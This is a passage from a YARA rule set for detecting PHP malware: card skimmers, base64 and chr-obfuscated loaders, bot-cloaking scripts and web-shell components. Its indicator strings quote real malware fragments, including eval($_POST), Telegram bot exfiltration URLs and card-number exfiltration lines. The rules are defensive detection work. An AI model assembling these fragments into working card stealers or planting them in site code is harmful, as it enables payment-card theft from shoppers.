        $trigger and PR04483 and PR00029 and PR04484 and $php_malware_base64_037_r0
}

// MANUAL FIX NECESSARY
rule php_malware_base64_037_02 : malware
{
    strings:
        $trigger = "]));if($_POST[base64_decode("
        $php_malware_base64_037_02_r0 = /\)\)\{@\$[\w]+\(\$_FILES\[base64_decode\(/
        $php_malware_base64_037_02_r1 = /file_put_contents\(.[\w]+\.php.,[\s]*.<\?php/
    condition:
        $trigger and PR00029 and PR04484 and PR01710 and $php_malware_base64_037_02_r0 and $php_malware_base64_037_02_r1
}

private rule PR04485 : trigger
{
    strings:
        $ps0 = "aWYgKCRpZCA9PSAiIik"
    condition:
        $ps0
}

rule php_malware_base64_038 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04485 and PR01398
}

private rule PR04486 : trigger
{
    strings:
        $ps0 = "PD9waHAKZWNobygnWHNhbS1YY"
    condition:
        $ps0
}

rule php_malware_base64_040 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04486 and PR01398
}

rule php_malware_base64_041 : malware
{
    strings:
        $trigger = "echo base64_decode('PHAgY2xhc3M9I"
    condition:
        $trigger and PR02092
}

private rule PR04487 : trigger
{
    strings:
        $ps0 = "));echo \" \";}echo base64_decode($"
    condition:
        $ps0
}

rule php_malware_base64_042 : malware
{
    strings:
        $trigger = "PHNjcmlw"
    condition:
        $trigger and PR04487
}

private rule PR04488 : trigger
{
    strings:
        $ps0 = "if (!isBot($uAg,$ip)) echo \"<a href="
    condition:
        $ps0
}

private rule PR04489 : trigger
{
    strings:
        $ps0 = "$fp = fopen("
    condition:
        $ps0
}

private rule PR04490 : trigger
{
    strings:
        $ps0 = "$GLOBALS['ipRanges"
    condition:
        $ps0
}

rule php_malware_botcheck_001 : malware
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR04488 and PR04489 and PR04490
}

private rule PR04491 : trigger
{
    strings:
        $ps0 = "return $BROWSER_ERROR"
    condition:
        $ps0
}

rule php_malware_browsercheck_001 : malware
{
    strings:
        $trigger = "if (preg_match($regex, $USER_AGENT)"
    condition:
        $trigger and PR04491
}

private rule PR04492 : trigger
{
    strings:
        $ps0 = "lookup.binlist.net"
    condition:
        $ps0
}

private rule PR04493 : trigger
{
    strings:
        $ps0 = "api.stripe.com"
    condition:
        $ps0
}

private rule PR04494 : trigger
{
    strings:
        $ps0 = "mail"
    condition:
        $ps0
}

rule php_malware_cc_checker_001 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04492 and PR00091 and PR04493 and PR00341 and PR04494
}

private rule PR04495 : trigger
{
    strings:
        $ps0 = "bins.su"
    condition:
        $ps0
}

rule php_malware_cc_checker_002 : malware
{
    strings:
        $trigger = "api.telegram.org/bot$"
    condition:
        $trigger and PR02062 and PR04495 and PR04493 and PR01021
}

private rule PR04496 : trigger
{
    strings:
        $ps0 = "http_build_query(array('s'=>base64_encode(json_encode(array_merge"
    condition:
        $ps0
}

private rule PR04497 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL, base64_decode"
    condition:
        $ps0
}

rule php_malware_cc_stealer_001 : malware
{
    strings:
        $trigger = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
    condition:
        $trigger and PR04496 and PR04497
}

// MANUAL FIX NECESSARY
rule php_malware_cc_stealer_001_02 : malware
{
    strings:
        $trigger = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
        $php_malware_cc_stealer_001_02_r0 = /\$[\w]+\)[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*curl_init\(\);/
        $php_malware_cc_stealer_001_02_r1 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$[\w]+\)[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*curl_init\(\);[\s]*curl_setopt/
    condition:
        $trigger and PR04497 and $php_malware_cc_stealer_001_02_r0 and $php_malware_cc_stealer_001_02_r1
}

// MANUAL FIX NECESSARY
rule php_malware_cc_stealer_001_03 : malware
{
    strings:
        $trigger = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
        $php_malware_cc_stealer_001_03_r0 = /file_get_contents[\s\(]+base64_decode\(.aH/
    condition:
        $trigger and $php_malware_cc_stealer_001_03_r0
}

rule php_malware_cc_stealer_002 : malware
{
    strings:
        $trigger = "$cre_f=$abc('',$pack(\"H*"
    condition:
        $trigger
}

rule php_malware_cc_stealer_003 : malware
{
    strings:
        $trigger = "IiwgInskdXNlcmluZm9bImNhcmRfbnVtYmVyIl19f"
    condition:
        $trigger and PR00029
}

private rule PR04498 : trigger
{
    strings:
        $ps0 = "'x_card_code' => urlencode($x_card_code),"
    condition:
        $ps0
}

rule php_malware_cc_stealer_004 : malware
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04498 and PR01401
}

rule php_malware_cc_stealer_005 : malware
{
    strings:
        $trigger = "\\x63\\x63\\x5F\\x6E\\x75\\x6D\\x62\\x65\\x72\",\"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66"
    condition:
        $trigger and PR00638 and PR00639
}

rule php_malware_cc_stealer_006 : malware
{
    strings:
        $trigger = "sagepaydirectpro_cc_number"
    condition:
        $trigger and PR00652 and PR01325
}

rule php_malware_cc_stealer_007 : malware
{
    strings:
        $trigger = "CURLOPT_POSTFIELDS, \"payment=\""
    condition:
        $trigger and PR01522
}

private rule PR04499 : trigger
{
    strings:
        $ps0 = "ACCOUNT PAYPAL FULLZ"
    condition:
        $ps0
}

rule php_malware_cc_stealer_008 : malware
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00301 and PR04499
}

private rule PR04500 : trigger
{
    strings:
        $ps0 = "HEADER(\"Location:"
    condition:
        $ps0
}

private rule PR04501 : trigger
{
    strings:
        $ps0 = "SCAM PAYPAL"
    condition:
        $ps0
}

rule php_malware_cc_stealer_008_02 : malware
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR04500 and PR00301 and PR04501
}

private rule PR04502 : trigger
{
    strings:
        $ps0 = "@\\x66\\x6F\\x70\\x65\\x6E(\\$"
    condition:
        $ps0
}

rule php_malware_cc_stealer_009 : malware
{
    strings:
        $trigger = "eval(\\$\\x5F\\x50\\x4F\\x53\\x54["
    condition:
        $trigger and PR01483 and PR04502
}

rule php_malware_cc_stealer_010 : malware
{
    strings:
        $trigger = ".$this->common_vars[\"billing_address\"][\"value\"]."
    condition:
        $trigger and PR01553 and PR01401
}

private rule PR04503 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['Card_Number']) &&"
    condition:
        $ps0
}

private rule PR04504 : trigger
{
    strings:
        $ps0 = ".urlencode($"
    condition:
        $ps0
}

rule php_malware_cc_stealer_011 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04503 and PR04504
}

private rule PR04505 : trigger
{
    strings:
        $ps0 = "@json_decode(file_get_contents(\"http://ip-api.com"
    condition:
        $ps0
}

rule php_malware_cc_stealer_012 : malware
{
    strings:
        $trigger = "$RANDOMSTRING .= $CHARACTERS[rand(0, strlen($CHARACTERS) - 1)];"
    condition:
        $trigger and PR00273 and PR01403 and PR04505
}

private rule PR04506 : trigger
{
    strings:
        $ps0 = "\\n CVV: $"
    condition:
        $ps0
}

private rule PR04507 : trigger
{
    strings:
        $ps0 = "@mail($para, $assunto, $msg, $headers);"
    condition:
        $ps0
}

rule php_malware_cc_stealer_013 : malware
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04506 and PR04507
}

private rule PR04508 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['cardtype'])||isset($_POST['cardzip"
    condition:
        $ps0
}

rule php_malware_cc_stealer_014 : malware
{
    strings:
        $trigger = "foreach($_POST"
    condition:
        $trigger and PR04508 and PR00301
}

private rule PR04509 : trigger
{
    strings:
        $ps0 = "@fputs($f, $tmp . @gzdeflate(time"
    condition:
        $ps0
}

private rule PR04510 : trigger
{
    strings:
        $ps0 = "file_get_contents('php://input"
    condition:
        $ps0
}

rule php_malware_cc_stealer_015 : malware
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR04509 and PR04510
}

private rule PR04511 : trigger
{
    strings:
        $ps0 = " if ((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER['REQUEST_URI'], 'simplecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onepagecheckout'))"
    condition:
        $ps0
}

rule php_malware_cc_stealer_016 : malware
{
    strings:
        $trigger = "die("
    condition:
        $trigger and PR04511 and PR01490
}

private rule PR04512 : trigger
{
    strings:
        $ps0 = "curl_setopt($secpay, CURLOPT_HEADER, 0); curl_setopt($secpay, CURLOPT_POSTFIELDS, \"dm"
    condition:
        $ps0
}

private rule PR04513 : trigger
{
    strings:
        $ps0 = "urlencode(\"$creditCardNumber|$expDate|$cvv2|$firstName $lastName"
    condition:
        $ps0
}

rule php_malware_cc_stealer_017 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04512 and PR04513
}

rule php_malware_cc_stealer_017_02 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04513
}

private rule PR04514 : trigger
{
    strings:
        $ps0 = "curl_exec($secpay);"
    condition:
        $ps0
}

rule php_malware_cc_stealer_017_03 : malware
{
    strings:
        $trigger = "urlencode(\"$creditCardNumber|$expDate|$cvv2|$firstName $lastName"
    condition:
        $trigger and PR04514
}

private rule PR04515 : trigger
{
    strings:
        $ps0 = "aHR0cHM6Ly9"
    condition:
        $ps0
}

rule php_malware_cc_stealer_018 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00665 and PR01325 and PR04515
}

private rule PR04516 : trigger
{
    strings:
        $ps0 = ":sptth"
    condition:
        $ps0
}

rule php_malware_cc_stealer_019 : malware
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR01579 and PR04516
}

rule php_malware_cc_stealer_021 : malware
{
    strings:
        $trigger = "K1GY5P3JJdv77W+t6O5zAdb0ELE9VnZ5Oee0/FIjX5MaO3/AQ="
    condition:
        $trigger and PR01398
}

private rule PR04517 : trigger
{
    strings:
        $ps0 = "['card_cvv'] . \",\" ."
    condition:
        $ps0
}

rule php_malware_cc_stealer_022 : malware
{
    strings:
        $trigger = "txt\", $str.\"\\n\", FILE_APPEND);"
    condition:
        $trigger and PR00435 and PR04517
}

private rule PR04518 : trigger
{
    strings:
        $ps0 = "urlencode($HTTP_POST_VARS['authorizenet_cc_number']).'&"
    condition:
        $ps0
}

rule php_malware_cc_stealer_023 : malware
{
    strings:
        $trigger = "curl_init(base64_decode('"
    condition:
        $trigger and PR01553 and PR01401 and PR04518
}

private rule PR04519 : trigger
{
    strings:
        $ps0 = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
    condition:
        $ps0
}

rule php_malware_cc_stealer_024 : malware
{
    strings:
        $trigger = "base64_encode(json_encode($_POST)),'user_ip'=>$_SERVER['REMOTE_ADDR']"
    condition:
        $trigger and PR04497 and PR04519
}

private rule PR04520 : trigger
{
    strings:
        $ps0 = "json_decode(file_get_contents("
    condition:
        $ps0
}

private rule PR04521 : trigger
{
    strings:
        $ps0 = "if (strlen($"
    condition:
        $ps0
}

private rule PR04522 : trigger
{
    strings:
        $ps0 = "getQuote()"
    condition:
        $ps0
}

rule php_malware_cc_stealer_025 : malware
{
    strings:
        $trigger = "$send = array("
    condition:
        $trigger and PR04520 and PR04521 and PR04522 and PR00301
}

// MANUAL FIX NECESSARY
private rule PR04523 : trigger
{
    strings:
        $ps0 = "http_build_query(array("
    condition:
        $ps0
}

private rule PR04524 : trigger
{
    strings:
        $ps0 = "base64_decode('aH"
    condition:
        $ps0
}

rule php_malware_cc_stealer_026 : malware
{
    strings:
        $trigger = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
        $php_malware_cc_stealer_026_r0 = /array_merge\([\s]*\$_POST/
    condition:
        $trigger and PR04523 and PR04497 and PR04524 and $php_malware_cc_stealer_026_r0
}

private rule PR04525 : trigger
{
    strings:
        $ps0 = "Magento\\Checkout\\Model\\Cart"
    condition:
        $ps0
}

private rule PR04526 : trigger
{
    strings:
        $ps0 = "stream_context_create(array("
    condition:
        $ps0
}

private rule PR04527 : trigger
{
    strings:
        $ps0 = "=>@$_REQUEST["
    condition:
        $ps0
}

rule php_malware_cc_stealer_027 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04525 and PR04522 and PR04526 and PR04527
}

// MANUAL FIX NECESSARY
private rule PR04528 : trigger
{
    strings:
        $ps0 = "$email = trim(Tools::getValue('email'));"
    condition:
        $ps0
}

rule php_malware_cc_stealer_028 : malware
{
    strings:
        $trigger = "public function"
        $php_malware_cc_stealer_028_r0 = /\$message[\s]*\.?=[\s]*['\"][\s]*[-+=*!@#~_.\|\[\]><]{3,}[\s]*[-+=*!@#~_.><\w]{2,}/
    condition:
        $trigger and PR00279 and PR04528 and $php_malware_cc_stealer_028_r0
}

private rule PR04529 : trigger
{
    strings:
        $ps0 = "$_SESSION['_cc_"
    condition:
        $ps0
}

rule php_malware_cc_stealer_029 : malware
{
    strings:
        $trigger = "@json_decode(file_get_contents("
    condition:
        $trigger and PR04529
}

private rule PR04530 : trigger
{
    strings:
        $ps0 = ".\"|:|:|\".$_SERVER['REMOTE_ADDR'].\"|:|:|\""
    condition:
        $ps0
}

rule php_malware_cc_stealer_030 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03177 and PR04530
}

private rule PR04531 : trigger
{
    strings:
        $ps0 = "(strpos(json_encode($this->getPostFields"
    condition:
        $ps0
}

private rule PR04532 : trigger
{
    strings:
        $ps0 = "file_put_contents($_SERVER[\"DOCUMENT_ROOT\"]."
    condition:
        $ps0
}

rule php_malware_cc_stealer_031 : malware
{
    strings:
        $trigger = "=>$this->getPostFields()"
    condition:
        $trigger and PR04531 and PR04532
}

private rule PR04533 : trigger
{
    strings:
        $ps0 = ".json_encode($_POST)."
    condition:
        $ps0
}

rule php_malware_cc_stealer_032 : malware
{
    strings:
        $trigger = "(preg_match(\"/\".$value.\"/i\","
    condition:
        $trigger and PR04533 and PR00341
}

// MANUAL FIX NECESSARY
rule php_malware_cc_stealer_033 : malware
{
    strings:
        $trigger = "http_build_query($_REQUEST);"
        $php_malware_cc_stealer_033_r0 = /\$[\w]+[\s]*=[\s]*http_build_query\(\$_REQUEST\);[\s]*\$[\w]+[\s]*=[\s]*curl_init\(\);[\s]*curl_setopt\(\$[\w]+[\s]*,[\s]*CURLOPT_URL,[\s]*.http/
    condition:
        $trigger and PR01553 and PR01401 and $php_malware_cc_stealer_033_r0
}

private rule PR04534 : trigger
{
    strings:
        $ps0 = "function validateData()"
    condition:
        $ps0
}

private rule PR04535 : trigger
{
    strings:
        $ps0 = "print_r($_REQUEST, 1)"
    condition:
        $ps0
}

rule php_malware_cc_stealer_034 : malware
{
    strings:
        $trigger = "Payment"
    condition:
        $trigger and PR04534 and PR04535 and PR02208
}

private rule PR04536 : trigger
{
    strings:
        $ps0 = "Payment"
    condition:
        $ps0
}

rule php_malware_cc_stealer_034_02 : malware
{
    strings:
        $trigger = "$this->validateData();"
    condition:
        $trigger and PR04534 and PR02208 and PR04536
}

private rule PR04537 : trigger
{
    strings:
        $ps0 = "wc-authorize-net-cim"
    condition:
        $ps0
}

rule php_malware_cc_stealer_035 : malware
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04537 and PR04124
}

rule php_malware_cc_stealer_037 : malware
{
    strings:
        $trigger = "$this->sqlite->exec(\"INSERT INTO cards (card_number, cc_expires, card_cvv,"
    condition:
        $trigger and PR01458
}

private rule PR04538 : trigger
{
    strings:
        $ps0 = "=['src',"
    condition:
        $ps0
}

private rule PR04539 : trigger
{
    strings:
        $ps0 = "))[0x0]),document['getElementsByTagName'](String[_0x"
    condition:
        $ps0
}

rule php_malware_cc_stealer_038 : malware
{
    strings:
        $trigger = "))[0x0]),_0x"
    condition:
        $trigger and PR04538 and PR00639 and PR04539
}

private rule PR04540 : trigger
{
    strings:
        $ps0 = "])) > 2 && $"
    condition:
        $ps0
}

private rule PR04541 : trigger
{
    strings:
        $ps0 = "]] : \"\")));"
    condition:
        $ps0
}

private rule PR04542 : trigger
{
    strings:
        $ps0 = "]) === \"\") ? \"\" : $"
    condition:
        $ps0
}

private rule PR04543 : trigger
{
    strings:
        $ps0 = "] . PHP_EOL . $"
    condition:
        $ps0
}

rule php_malware_cc_stealer_039 : malware
{
    strings:
        $trigger = "return ((isset($_SERVER["
    condition:
        $trigger and PR04540 and PR04541 and PR04542 and PR04543
}

rule php_malware_cc_stealer_040 : malware
{
    strings:
        $trigger = "$get.'?Card='.$_REQUEST['Card'].'&Exp="
    condition:
        $trigger and PR01431
}

private rule PR04544 : trigger
{
    strings:
        $ps0 = "@$_REQUEST['ccc"
    condition:
        $ps0
}

rule php_malware_cc_stealer_041 : malware
{
    strings:
        $trigger = "http_build_query($"
    condition:
        $trigger and PR01553 and PR01401 and PR04544
}

private rule PR04545 : trigger
{
    strings:
        $ps0 = "isset($_POST['payment_method'])"
    condition:
        $ps0
}

rule php_malware_cc_stealer_042 : malware
{
    strings:
        $trigger = ".http_build_query(array("
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR04545
}

// MANUAL FIX NECESSARY
private rule PR04546 : trigger
{
    strings:
        $ps0 = "return ((isset($_SERVER[$"
    condition:
        $ps0
}

private rule PR04547 : trigger
{
    strings:
        $ps0 = ". PHP_EOL . $"
    condition:
        $ps0
}

rule php_malware_cc_stealer_043 : malware
{
    strings:
        $trigger = "]) === \"\") ? \"\" : $"
        $php_malware_cc_stealer_043_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_malware_cc_stealer_043_r1 = /function[\s]*[\w]+\(\$[\w]+\)[\s]*\{[\s]*global[\s]*\$[\w]+;[\s]*if[\s]*\(!\$[\w]+\[[\d]+\]\(\$[\w]+\)\)[\s]*return;[\s]*if[\s]*\(\$[\w]+\[[\d]+\]\(\$[\w]+\[[\d]+\]\)\)[\s]*\{[\s]*\$[\w]+/
    condition:
        $trigger and PR04546 and PR04547 and PR01016 and $php_malware_cc_stealer_043_r0 and $php_malware_cc_stealer_043_r1
}

private rule PR04548 : trigger
{
    strings:
        $ps0 = "PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cH"
    condition:
        $ps0
}

rule php_malware_cc_stealer_044 : malware
{
    strings:
        $trigger = ".=base64_decode("
    condition:
        $trigger and PR04548
}

private rule PR04549 : trigger
{
    strings:
        $ps0 = "KXtldmFsKGJhc2U2NF9kZWNvZGUo"
    condition:
        $ps0
}

rule php_malware_cc_stealer_045 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04549
}

private rule PR04550 : trigger
{
    strings:
        $ps0 = "('', array(\"\\"
    condition:
        $ps0
}

private rule PR04551 : trigger
{
    strings:
        $ps0 = "exec("
    condition:
        $ps0
}

rule php_malware_cc_stealer_046 : malware
{
    strings:
        $trigger = ": $_REQUEST = array_merge($_REQUEST, $"
    condition:
        $trigger and PR04550 and PR04551 and PR04429
}

private rule PR04552 : trigger
{
    strings:
        $ps0 = ")), false, stream_context_create(array("
    condition:
        $ps0
}

rule php_malware_cc_stealer_046_02 : malware
{
    strings:
        $trigger = ": $_REQUEST = array_merge($_REQUEST, $"
    condition:
        $trigger and PR04523 and PR04552 and PR04429
}

private rule PR04553 : trigger
{
    strings:
        $ps0 = "billing_address"
    condition:
        $ps0
}

private rule PR04554 : trigger
{
    strings:
        $ps0 = "]($_GET[_"
    condition:
        $ps0
}

rule php_malware_cc_stealer_047 : malware
{
    strings:
        $trigger = "$wpdb->get_results($wpdb->prepare($"
    condition:
        $trigger and PR04553 and PR04554 and PR01775
}

private rule PR04555 : trigger
{
    strings:
        $ps0 = "] . $"
    condition:
        $ps0
}

private rule PR04556 : trigger
{
    strings:
        $ps0 = "($_COOKIE[$"
    condition:
        $ps0
}

private rule PR04557 : trigger
{
    strings:
        $ps0 = "strrev(substr("
    condition:
        $ps0
}

private rule PR04558 : trigger
{
    strings:
        $ps0 = ") % sizeof($"
    condition:
        $ps0
}

rule php_malware_cc_stealer_049 : malware
{
    strings:
        $trigger = "[] = substr($"
    condition:
        $trigger and PR04555 and PR04556 and PR04557 and PR04558 and PR01350
}

private rule PR04559 : trigger
{
    strings:
        $ps0 = "jQuery(atob(\""
    condition:
        $ps0
}

rule php_malware_cc_stealer_050 : malware
{
    strings:
        $trigger = "PGltZyBpZD0ic3RvcmVfaW1nXzE4MCIgc"
    condition:
        $trigger and PR04559
}

rule php_malware_cc_stealer_051 : malware
{
    strings:
        $trigger = "curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot' . $bot_token . '/sendMessage');"
    condition:
        $trigger and PR03281
}

// MANUAL FIX NECESSARY
private rule PR04560 : trigger
{
    strings:
        $ps0 = ".=base64_decode("
    condition:
        $ps0
}

rule php_malware_cc_stealer_052 : malware
{
    strings:
        $trigger = ".hex2bin('3C73637269707420747970653D227"
        $php_malware_cc_stealer_052_r0 = /\$html\.hex2bin\(.\w+.\);echo\s*trim\(\$html\);/
    condition:
        $trigger and PR04560 and $php_malware_cc_stealer_052_r0
}

// MANUAL FIX NECESSARY
rule php_malware_cc_stealer_052_02 : malware
{
    strings:
        $trigger = ".hex2bin('3C73637269707420747970653D227"
        $php_malware_cc_stealer_052_02_r0 = /\$html.=base64_decode\(\\"[^\\"]*\\"\);\s*\}\s*echo\s*trim\(\$html\);/
    condition:
        $trigger and PR04560 and $php_malware_cc_stealer_052_02_r0
}

private rule PR04561 : trigger
{
    strings:
        $ps0 = "YUhSMGNITTZMeTloWTNScGRtVXVZV0Z6YlM1d2NtOHZjbVZ3"
    condition:
        $ps0
}

rule php_malware_cc_stealer_053 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR04561 and PR00664 and PR00666
}

private rule PR04562 : trigger
{
    strings:
        $ps0 = "'ce-order','&payment[u',"
    condition:
        $ps0
}

private rule PR04563 : trigger
{
    strings:
        $ps0 = "_0x"
    condition:
        $ps0
}

rule php_malware_cc_stealer_054 : malware
{
    strings:
        $trigger = ";for(var"
    condition:
        $trigger and PR04562 and PR00323 and PR04563
}

private rule PR04564 : trigger
{
    strings:
        $ps0 = "for($i=0;$i<strlen("
    condition:
        $ps0
}

private rule PR04565 : trigger
{
    strings:
        $ps0 = "[$i] = chr(ord("
    condition:
        $ps0
}

rule php_malware_chord64_001 : malware
{
    strings:
        $trigger = "[$i])-1);"
    condition:
        $trigger and PR01436 and PR00029 and PR04564 and PR04565
}

rule php_malware_chord64_001_02 : malware
{
    strings:
        $trigger = "[$i])-1);"
    condition:
        $trigger and PR01436 and PR00029 and PR04564 and PR02127
}

rule php_malware_chord64_001_03 : malware
{
    strings:
        $trigger = "[$i])-1);"
    condition:
        $trigger and PR01436 and PR04564 and PR01550
}

private rule PR04566 : trigger
{
    strings:
        $ps0 = "for ($i = 0; $i < strlen($"
    condition:
        $ps0
}

private rule PR04567 : trigger
{
    strings:
        $ps0 = "[$i]) - 1);"
    condition:
        $ps0
}

rule php_malware_chord64_001_04 : malware
{
    strings:
        $trigger = "[$i] = chr(ord("
    condition:
        $trigger and PR01436 and PR00029 and PR04566 and PR04567
}

// MANUAL FIX NECESSARY
rule php_malware_chr_base64_002 : malware
{
    strings:
        $trigger = "chr(98)"
        $php_malware_chr_base64_002_r0 = /\.\s*chr\(\d+\)\s*\./
        $php_malware_chr_base64_002_r1 = /<\?php[\s]*\$[\w][\s]*=[\s]*chr\([^;]+chr\([\d]+\)[\s]*\.[\s]*chr\(/
    condition:
        $trigger and $php_malware_chr_base64_002_r0 and $php_malware_chr_base64_002_r1
}

private rule PR04568 : trigger
{
    strings:
        $ps0 = "eNqVWAt3osgS/itMjmeVExMB8cG6zJ1MYjJmoo7PqNk5HoQG"
    condition:
        $ps0
}

rule php_malware_chr_base64_003 : malware
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR04568
}

// MANUAL FIX NECESSARY
rule php_malware_comment_tag_004 : malware
{
    strings:
        $trigger = "<script"
        $php_malware_comment_tag_004_r0 = /<\/script><.--\w{48}-->/
    condition:
        $trigger and $php_malware_comment_tag_004_r0
}

private rule PR04569 : trigger
{
    strings:
        $ps0 = "\", 2, time()+999999999, \"/\");?>"
    condition:
        $ps0
}

rule php_malware_component_001 : malware
{
    strings:
        $trigger = "<?php setcookie(\""
    condition:
        $trigger and PR04569
}

private rule PR04570 : trigger
{
    strings:
        $ps0 = "unset($_SERVER['HTTP_X_FORWARDED_FOR']);"
    condition:
        $ps0
}

private rule PR04571 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_USER_AGENT'] = '';"
    condition:
        $ps0
}

rule php_malware_component_004 : malware
{
    strings:
        $trigger = "if (!isset($_REQUEST["
    condition:
        $trigger and PR04570 and PR04571
}

rule php_malware_component_005 : malware
{
    strings:
        $trigger = "$sfolders[count($sexpl)][] = $droot.\"||\".str_replace($droot,\"\",$_wfolders_);"
    condition:
        $trigger and PR00265
}

private rule PR04572 : trigger
{
    strings:
        $ps0 = "$index=\"file.php?id=$file\";"
    condition:
        $ps0
}

rule php_malware_component_006 : malware
{
    strings:
        $trigger = "header('Location: ' . $index);"
    condition:
        $trigger and PR04572
}

private rule PR04573 : trigger
{
    strings:
        $ps0 = "wfHash(ABSPATH . $file)) > 1 && strlen($shac = strtoupper($hash"
    condition:
        $ps0
}

rule php_malware_component_008 : malware
{
    strings:
        $trigger = "method_exists(\"wordfenceHash\", \"wfHash\") && count($hash = @wordfenceHash:"
    condition:
        $trigger and PR00279 and PR04573
}

private rule PR04574 : trigger
{
    strings:
        $ps0 = "echo \"Directory ledu\";"
    condition:
        $ps0
}

rule php_malware_component_009 : malware
{
    strings:
        $trigger = "echo \"Directory undi\";"
    condition:
        $trigger and PR04574
}

private rule PR04575 : trigger
{
    strings:
        $ps0 = "rename ($inn.\".php.suspected\", $inn.\".php\");"
    condition:
        $ps0
}

rule php_malware_component_010 : malware
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR04575
}

rule php_malware_component_011 : malware
{
    strings:
        $trigger = "echo base64_decode(\"bGFkeWdhZ2F5\");"
    condition:
        $trigger
}

private rule PR04576 : trigger
{
    strings:
        $ps0 = "md5($_COOKIE"
    condition:
        $ps0
}

private rule PR04577 : trigger
{
    strings:
        $ps0 = "test ok"
    condition:
        $ps0
}

private rule PR04578 : trigger
{
    strings:
        $ps0 = "header(\"HTTP/1.1 404 Not Found\");"
    condition:
        $ps0
}

rule php_malware_component_012 : malware
{
    strings:
        $trigger = "header(\"Status: 404 Not Found\");"
    condition:
        $trigger and PR04576 and PR01788 and PR02056 and PR04577 and PR00039 and PR04578
}

private rule PR04579 : trigger
{
    strings:
        $ps0 = "'./.htaccess';"
    condition:
        $ps0
}

rule php_malware_component_013 : malware
{
    strings:
        $trigger = "!file_exists($now"
    condition:
        $trigger and PR00435 and PR04579
}

private rule PR04580 : trigger
{
    strings:
        $ps0 = "@unlink($sitemap);"
    condition:
        $ps0
}

rule php_malware_component_013_02 : malware
{
    strings:
        $trigger = "!file_exists($now"
    condition:
        $trigger and PR00435 and PR04580
}

rule php_malware_component_013_03 : malware
{
    strings:
        $trigger = "@chmod($nowHtacFile,0555);"
    condition:
        $trigger and PR00435
}

private rule PR04581 : trigger
{
    strings:
        $ps0 = "$text=json_encode($alltext);"
    condition:
        $ps0
}

rule php_malware_component_014 : malware
{
    strings:
        $trigger = "true){ echo 'site ok';"
    condition:
        $trigger and PR04581
}

private rule PR04582 : trigger
{
    strings:
        $ps0 = "$file = 'ips.txt';"
    condition:
        $ps0
}

private rule PR04583 : trigger
{
    strings:
        $ps0 = "fwrite($fp, $ipaddress);"
    condition:
        $ps0
}

rule php_malware_component_015 : malware
{
    strings:
        $trigger = "(!empty($_SERVER['HTTP_CLIENT_IP']))"
    condition:
        $trigger and PR04582 and PR03964 and PR04583
}

private rule PR04584 : trigger
{
    strings:
        $ps0 = "unlink($filename); "
    condition:
        $ps0
}

rule php_malware_component_016 : malware
{
    strings:
        $trigger = "$dz2d = \"sql.php\";"
    condition:
        $trigger and PR04584
}

private rule PR04585 : trigger
{
    strings:
        $ps0 = ".=$_ while(<DATA>);"
    condition:
        $ps0
}

rule php_malware_component_017 : malware
{
    strings:
        $trigger = "unpack('u*',$"
    condition:
        $trigger and PR04585
}

private rule PR04586 : trigger
{
    strings:
        $ps0 = "_cfg_popuplink"
    condition:
        $ps0
}

private rule PR04587 : trigger
{
    strings:
        $ps0 = "_option"
    condition:
        $ps0
}

rule php_malware_component_018 : malware
{
    strings:
        $trigger = "'url' => 'http://tiny.cc"
    condition:
        $trigger and PR04586 and PR04587
}

rule php_malware_component_020 : malware
{
    strings:
        $trigger = "if ($_SERVER[\"QUERY_STRING\"]) { exit($_SERVER[\"QUERY_STRING\"]); }"
    condition:
        $trigger and PR01993
}

private rule PR04588 : trigger
{
    strings:
        $ps0 = "unlink(\"/home/\".$cur_dir[2].\"/.cpanel/contactinfo\");"
    condition:
        $ps0
}

rule php_malware_component_021 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04588 and PR01362
}

private rule PR04589 : trigger
{
    strings:
        $ps0 = "unlink($_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']);"
    condition:
        $ps0
}

rule php_malware_component_022 : malware
{
    strings:
